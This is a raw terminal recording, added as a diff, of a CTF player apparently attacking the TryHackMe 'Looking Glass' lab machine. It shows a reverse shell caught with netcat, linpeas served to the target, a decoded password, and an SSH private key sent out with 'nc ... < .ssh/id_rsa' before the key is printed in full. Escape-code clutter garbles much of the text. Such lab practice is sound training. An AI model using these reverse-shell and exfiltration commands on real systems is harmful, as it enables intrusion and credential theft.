@@ -1,0 +1,207 @@
+Script started on 2021-03-25 00:14:07+05:30 [TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="80" LINES="24"]
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_looking_glass[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_looking_glass[00m$ cd ..[K[K[K[K[Kcp /home/u [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cs upitha/Documents/linpeas.sh .
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_looking_glass[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_looking_glass[00m$ python3 -m  http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.221.243 - - [25/Mar/2021 00:15:25] "GET /linpeas.sh HTTP/1.1" 200 -
+^C
+Keyboard interrupt received, exiting.
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_looking_glass[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_looking_glass[00m$ [K]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_looking_glass[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_looking_glass[00m$ nc -lvnp 9999
+Listening on 0.0.0.0 9999
+Connection received on 10.10.221.243 41346
+bash: cannot set terminal process group (882): Inappropriate ioctl for device
+bash: no job control in this shell
+tweedledum@looking-glass:~$ id
+id
+uid=1002(tweedledum) gid=1002(tweedledum) groups=1002(tweedledum)
+tweedledum@looking-glass:~$ ls
+ls
+humptydumpty.txt
+poem.txt
+tweedledum@looking-glass:~$ cat hu	mptydumptyu .txt
+cat humptydumpty.txt
+dcfff5eb40423f055a4cd0a8d7ed39ff6cb9816868f5766b4088b9e9906961b9
+7692c3ad3540bb803c020b3aee66cd8887123234ea0c6e7143c0add73ff431ed
+28391d3bc64ec15cbb090426b04aa6b7649c3cc85f11230bb0105e02d15e3624
+b808e156d18d1cecdcc1456375f8cae994c36549a07c8c2315b473dd9d7f404f
+fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6
+b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0
+5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
+7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b
+tweedledum@looking-glass:~$ zyxwvutsrqponmlk
+zyxwvutsrqponmlk
+zyxwvutsrqponmlk: command not found
+tweedledum@looking-glass:~$ id
+id
+uid=1002(tweedledum) gid=1002(tweedledum) groups=1002(tweedledum)
+tweedledum@looking-glass:~$ su humptydumpty
+su humptydumpty
+su: must be run from a terminal
+tweedledum@looking-glass:~$ id
+id
+uid=1002(tweedledum) gid=1002(tweedledum) groups=1002(tweedledum)
+tweedledum@looking-glass:~$ which python
+which python
+tweedledum@looking-glass:~$ ^[[A    which python3
+which python3
+/usr/bin/python3
+tweedledum@looking-glass:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+tweedledum@looking-glass:~$ ^Z
+[1]+  Stopped                 nc -lvnp 9999
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_looking_glass[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_looking_glass[00m$ stty raw -echo
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_looking_glass[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_looking_glass[00m$ nc -lvnp 9999
+
+tweedledum@looking-glass:~$ ls
+humptydumpty.txt  poem.txt
+tweedledum@looking-glass:~$ su humptydumpty  
+Password: 
+humptydumpty@looking-glass:/home/tweedledum$ id
+uid=1004(humptydumpty) gid=1004(humptydumpty) groups=1004(humptydumpty)
+humptydumpty@looking-glass:/home/tweedledum$ ls
+ls: cannot open directory '.': Permission denied
+humptydumpty@looking-glass:/home/tweedledum$ cd
+humptydumpty@looking-glass:~$ ls
+poetry.txt
+humptydumpty@looking-glass:~$ id
+uid=1004(humptydumpty) gid=1004(humptydumpty) groups=1004(humptydumpty)
+humptydumpty@looking-glass:~$ sudo -l
+[sudo] password for humptydumpty: 
+Sorry, user humptydumpty may not run sudo on looking-glass.
+humptydumpty@looking-glass:~$ ls -la
+total 28
+drwx------ 3 humptydumpty humptydumpty 4096 Mar 24 19:31 .
+drwxr-xr-x 8 root         root         4096 Jul  3  2020 ..
+lrwxrwxrwx 1 root         root            9 Jul  3  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 humptydumpty humptydumpty  220 Jul  3  2020 .bash_logout
+-rw-r--r-- 1 humptydumpty humptydumpty 3771 Jul  3  2020 .bashrc
+drwx------ 3 humptydumpty humptydumpty 4096 Mar 24 19:31 .gnupg
+-rw-r--r-- 1 humptydumpty humptydumpty  807 Jul  3  2020 .profile
+-rw-r--r-- 1 humptydumpty humptydumpty 3084 Jul  3  2020 poetry.txt
+humptydumpty@looking-glass:~$ cat [ poetry.txt 
+‘You seem very clever at explaining words, Sir,’ said Alice. ‘Would you kindly tell me the meaning of the poem called “Jabberwocky”?’
+
+‘Let’s hear it,’ said Humpty Dumpty. ‘I can explain all the poems that were ever invented—and a good many that haven’t been invented just yet.’
+
+This sounded very hopeful, so Alice repeated the first verse:
+
+     ‘Twas brillig, and the slithy toves
+      Did gyre and gimble in the wabe;
+     All mimsy were the borogoves,
+      And the mome raths outgrabe.
+‘That’s enough to begin with,’ Humpty Dumpty interrupted: ‘there are plenty of hard words there. “Brillig” means four o’clock in the afternoon—the time when you begin broiling things for dinner.’
+
+‘That’ll do very well,’ said Alice: ‘and “slithy”?’
+
+‘Well, “slithy” means “lithe and slimy.” “Lithe” is the same as “active.” You see it’s like a portmanteau—there are two meanings packed up into one word.’
+
+‘I see it now,’ Alice remarked thoughtfully: ‘and what are “toves”?’
+
+‘Well, “toves” are something like badgers—they’re something like lizards—and they’re something like corkscrews.’
+
+‘They must be very curious looking creatures.’
+
+‘They are that,’ said Humpty Dumpty: ‘also they make their nests under sun-dials—also they live on cheese.’
+
+‘And what’s the “gyre” and to “gimble”?’
+
+‘To “gyre” is to go round and round like a gyroscope. To “gimble” is to make holes like a gimlet.’
+
+‘And “the wabe” is the grass-plot round a sun-dial, I suppose?’ said Alice, surprised at her own ingenuity.
+
+‘Of course it is. It’s called “wabe,” you know, because it goes a long way before it, and a long way behind it—’
+
+‘And a long way beyond it on each side,’ Alice added.
+
+‘Exactly so. Well, then, “mimsy” is “flimsy and miserable” (there’s another portmanteau for you). And a “borogove” is a thin shabby-looking bird with its feathers sticking out all round—something like a live mop.’
+
+‘And then “mome raths”?’ said Alice. ‘I’m afraid I’m giving you a great deal of trouble.’
+
+‘Well, a “rath” is a sort of green pig: but “mome” I’m not certain about. I think it’s short for “from home”—meaning that they’d lost their way, you know.’
+
+‘And what does “outgrabe” mean?’
+
+‘Well, “outgrabing” is something between bellowing and whistling, with a kind of sneeze in the middle: however, you’ll hear it done, maybe—down in the wood yonder—and when you’ve once heard it you’ll be quite content. Who’s been repeating all that hard stuff to you?’
+
+‘I read it in a book,’ said Alice. ‘But I had some poetry repeated to me, much easier than that, by—Tweedledee, I think it was.’
+
+‘As to poetry, you know,’ said Humpty Dumpty, stretching out one of his great hands, ‘I can repeat poetry as well as other folk, if it comes to that—’
+
+‘Oh, it needn’t come to that!’ Alice hastily said, hoping to keep him from beginning.
+humptydumpty@looking-glass:~$ c la s -la
+total 28
+drwx------ 3 humptydumpty humptydumpty 4096 Mar 24 19:31 .
+drwxr-xr-x 8 root         root         4096 Jul  3  2020 ..
+lrwxrwxrwx 1 root         root            9 Jul  3  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 humptydumpty humptydumpty  220 Jul  3  2020 .bash_logout
+-rw-r--r-- 1 humptydumpty humptydumpty 3771 Jul  3  2020 .bashrc
+drwx------ 3 humptydumpty humptydumpty 4096 Mar 24 19:31 .gnupg
+-rw-r--r-- 1 humptydumpty humptydumpty  807 Jul  3  2020 .profile
+-rw-r--r-- 1 humptydumpty humptydumpty 3084 Jul  3  2020 poetry.txt
+humptydumpty@looking-glass:~$ cd . /
+humptydumpty@looking-glass:/$ ls
+bin    dev   initrd.img      lib64       mnt   root  snap      sys  var
+boot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
+cdrom  home  lib             media       proc  sbin  swap.img  usr  vmlinuz.old
+humptydumpty@looking-glass:/$ cd mnt/
+humptydumpty@looking-glass:/mnt$ ls
+humptydumpty@looking-glass:/mnt$ cd ..
+humptydumpty@looking-glass:/$ cd t root/
+bash: cd: root/: Permission denied
+humptydumpty@looking-glass:/$ cd 
+humptydumpty@looking-glass:~$ ls
+poetry.txt
+humptydumpty@looking-glass:~$ cd ..
+humptydumpty@looking-glass:/home$ ls
+alice  humptydumpty  jabberwock  tryhackme  tweedledee  tweedledum
+humptydumpty@looking-glass:/home$ cd alice
+humptydumpty@looking-glass:/home/alice$ ls
+ls: cannot open directory '.': Permission denied
+humptydumpty@looking-glass:/home/alice$ cat     nc
+usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]
+	  [-m minttl] [-O length] [-P proxy_username] [-p source_port]
+	  [-q seconds] [-s source] [-T keyword] [-V rtable] [-W recvlimit] [-w timeout]
+	  [-X proxy_protocol] [-x proxy_address[:port]] 	  [destination] [port]
+humptydumpty@looking-glass:/home/alice$ lss  .id  ssh/id  
+ls: cannot open directory '.ssh/': Permission denied
+humptydumpty@looking-glass:/home/alice$ ls -la .ss   .ss          ls .ssh       nc .ssh/id_rsa-.ssh/id_rsaw.ssh/id_rsa -.ssh/id_rsa.ssh/id_rsa 3.ssh/id_rsa .ssh/id_rsa10.9.1.142.ssh/id_rsa .ssh/id_rsa9.ssh/id_rsa9.ssh/id_rsa9.ssh/id_rsa9.ssh/id_rsa .ssh/id_rsa<.ssh/id_rsa .ssh/id_rsa
+humptydumpty@looking-glass:/home/alice$ nc -w 3 10.9.1.142 9999 < .ssh/id_rsahumptydumpty@looking-glass:/home/alice$ nc -w 3 10.9.1.142 9humptydumpty@looking-glass:/home/alice$ nc -w 3 10.9.1.142 99humptydumpty@looking-glass:/home/alice$ nc -w 3 10.9.1.142 999humptydumpty@looking-glass:/home/alice$ nc -w 3 10.9.1.142 9999 < .ssh/id_rsa  < .ssh/id_rsa  < .ssh/id_rsa  < .ssh/id_rsa 4 < .ssh/id_rsa4 < .ssh/id_rsa44 < .ssh/id_rsahumptydumpty@looking-glass:/home/alice$ nc -w 3 10.9.1.142 4444 humptydumpty@looking-glass:/home/alice$ nc -w 3 10.9.1.142 4444 <humptydumpty@looking-glass:/home/alice$ nc -w 3 10.9.1.142 4444 < humptydumpty@looking-glass:/home/alice$ nc -w 3 10.9.1.142 4444 < .humptydumpty@looking-glass:/home/alice$ nc -w 3 10.9.1.142 4444 < .shumptydumpty@looking-glass:/home/alice$ nc -w 3 10.9.1.142 4444 < .sshumptydumpty@looking-glass:/home/alice$ nc -w 3 10.9.1.142 4444 < .sshhumptydumpty@looking-glass:/home/alice$ nc -w 3 10.9.1.142 4444 < .ssh/humptydumpty@looking-glass:/home/alice$ nc -w 3 10.9.1.142 4444 < .ssh/ihumptydumpty@looking-glass:/home/alice$ nc -w 3 10.9.1.142 4444 < .ssh/idhumptydumpty@looking-glass:/home/alice$ nc -w 3 10.9.1.142 4444 < .ssh/id_humptydumpty@looking-glass:/home/alice$ nc -w 3 10.9.1.142 4444 < .ssh/id_rhumptydumpty@looking-glass:/home/alice$ nc -w 3 10.9.1.142 4444 < .ssh/id_rshumptydumpty@looking-glass:/home/alice$ nc -w 3 10.9.1.142 4444 < .ssh/id_rsa
+humptydumpty@looking-glass:/home/alice$ cat .ssh/id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpgIBAAKCAQEAxmPncAXisNjbU2xizft4aYPqmfXm1735FPlGf4j9ExZhlmmD
+NIRchPaFUqJXQZi5ryQH6YxZP5IIJXENK+a4WoRDyPoyGK/63rXTn/IWWKQka9tQ
+2xrdnyxdwbtiKP1L4bq/4vU3OUcA+aYHxqhyq39arpeceHVit+jVPriHiCA73k7g
+HCgpkwWczNa5MMGo+1Cg4ifzffv4uhPkxBLLl3f4rBf84RmuKEEy6bYZ+/WOEgHl
+fks5ngFniW7x2R3vyq7xyDrwiXEjfW4yYe+kLiGZyyk1ia7HGhNKpIRufPdJdT+r
+NGrjYFLjhzeWYBmHx7JkhkEUFIVx6ZV1y+gihQIDAQABAoIBAQDAhIA5kCyMqtQj
+X2F+O9J8qjvFzf+GSl7lAIVuC5Ryqlxm5tsg4nUZvlRgfRMpn7hJAjD/bWfKLb7j
+/pHmkU1C4WkaJdjpZhSPfGjxpK4UtKx3Uetjw+1eomIVNu6pkivJ0DyXVJiTZ5jF
+ql2PZTVpwPtRw+RebKMwjqwo4k77Q30r8Kxr4UfX2hLHtHT8tsjqBUWrb/jlMHQO
+zmU73tuPVQSESgeUP2jOlv7q5toEYieoA+7ULpGDwDn8PxQjCF/2QUa2jFalixsK
+WfEcmTnIQDyOFWCbmgOvik4Lzk/rDGn9VjcYFxOpuj3XH2l8QDQ+GO+5BBg38+aJ
+cUINwh4BAoGBAPdctuVRoAkFpyEofZxQFqPqw3LZyviKena/HyWLxXWHxG6ji7aW
+DmtVXjjQOwcjOLuDkT4QQvCJVrGbdBVGOFLoWZzLpYGJchxmlR+RHCb40pZjBgr5
+8bjJlQcp6pplBRCF/OsG5ugpCiJsS6uA6CWWXe6WC7r7V94r5wzzJpWBAoGBAM1R
+aCg1/2UxIOqxtAfQ+WDxqQQuq3szvrhep22McIUe83dh+hUibaPqR1nYy1sAAhgy
+wJohLchlq4E1LhUmTZZquBwviU73fNRbID5pfn4LKL6/yiF/GWd+Zv+t9n9DDWKi
+WgT9aG7N+TP/yimYniR2ePu/xKIjWX/uSs3rSLcFAoGBAOxvcFpM5Pz6rD8jZrzs
+SFexY9P5nOpn4ppyICFRMhIfDYD7TeXeFDY/yOnhDyrJXcbOARwjivhDLdxhzFkx
+X1DPyif292GTsMC4xL0BhLkziIY6bGI9efC4rXvFcvrUqDyc9ZzoYflykL9KaCGr
++zlCOtJ8FQZKjDhOGnDkUPMBAoGBAMrVaXiQH8bwSfyRobE3GaZUFw0yreYAsKGj
+oPPwkhhxA0UlXdITOQ1+HQ79xagY0fjl6rBZpska59u1ldj/BhdbRpdRvuxsQr3n
+aGs//N64V4BaKG3/CjHcBhUA30vKCicvDI9xaQJOKardP/Ln+xM6lzrdsHwdQAXK
+e8wCbMuhAoGBAOKy5OnaHwB8PcFcX68srFLX4W20NN6cFp12cU2QJy2MLGoFYBpa
+dLnK/rW4O0JxgqIV69MjDsfRn1gZNhTTAyNnRMH1U7kUfPUB2ZXCmnCGLhAGEbY9
+k6ywCnCtTz2/sNEgNcx9/iZW+yVEm/4s9eonVimF+u19HJFOPJsAYxx0
+-----END RSA PRIVATE KEY-----
+humptydumpty@looking-glass:/home/alice$ ls -la .ssh/id_rsa
+-rw------- 1 humptydumpty humptydumpty 1679 Jul  3  2020 .ssh/id_rsa
+humptydumpty@looking-glass:/home/alice$ exit
+exit
+tweedledum@looking-glass:~$ exit
+exit
+tweedledum@looking-glass:~$ exit
+exit
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_looking_glass[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_looking_glass[00m$ ]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_looking_glass[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_looking_glass[00m$ ]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_looking_glass[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_looking_glass[00m$ exit
+
+Script done on 2021-03-25 01:26:09+05:30 [COMMAND_EXIT_CODE="0"]
